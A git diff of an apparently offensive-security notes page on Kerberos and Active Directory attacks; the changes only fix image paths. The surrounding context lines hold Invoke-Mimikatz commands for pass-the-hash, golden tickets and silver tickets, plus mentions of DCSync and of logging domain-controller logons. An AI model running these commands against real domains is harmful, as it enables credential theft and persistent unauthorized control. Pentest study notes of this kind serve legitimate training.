@@ -14,7 +14,7 @@
 
 **How Kerberos works**
 
-<figure><img src="../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 1. Password converted to NTLM hash. A Timestamp is encrypted and signed with the NTLM hash of the Users Password and sent to the KDC (AS-REQ)
 2. The TGT (Ticket granting ticket) is generated and encrypted & signed with the NTLM Hash of krbtgt hash
@@ -69,9 +69,9 @@ Invoke-Mimikatz -command '"sekurlsa:pth /user:svcadmin /domain:dom.local /ntlm:h
 **Create a golden ticket when we have the krbtgt hash extracted from above** \
 ****Invoke-Mimikatz - command '"kerberos::golden /User:Administrator /domain:dom.local /sid:S-1-5-21-..... /krbtgt:hash.... id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>
 
 Use DCsync Attack / more silent in DC Logs
 
@@ -97,7 +97,7 @@ Machine account hash (e.g. after krbtgt&#x20;
 **Get domain controller account hash**\
 Invoke-Mimikatz -Command '"kerberos:golden /domain:dom.local /sid:S-1-5... /target:target-host.local /service:cifs /rc4:hash /user:Administrator /ptt"'
 
-<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 * Target is the host from where whe have the service account hash
@@ -248,7 +248,7 @@ All logons on the DC are logged to C:\Windows\system32\kiwissp.log
 *   Well known abuse of proteced groups - see following permissions\
 
 
-    <figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src=".gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>
 
 ### Requirements
 
